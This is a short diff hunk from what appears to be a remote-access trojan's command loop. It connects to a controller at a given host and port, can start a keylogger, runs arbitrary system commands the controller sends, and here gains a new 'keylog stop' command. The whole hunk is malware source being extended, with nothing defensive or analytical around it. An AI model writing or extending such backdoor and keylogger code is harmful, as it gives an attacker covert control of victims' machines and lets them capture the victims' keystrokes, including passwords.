@@ -55,6 +55,9 @@ def run(host, port):
             elif command == "keylog start":
                 klogger.start()
                 socket_send(client_socket, "[+] Keylogger Started.")
+            elif command == "keylog stop":
+                klogger.stop()
+                socket_send(client_socket, "[+] Keylogger Stoped.")
             else:  # * Run Other System Commands
                 execute_system_command(client_socket, command)
     except:
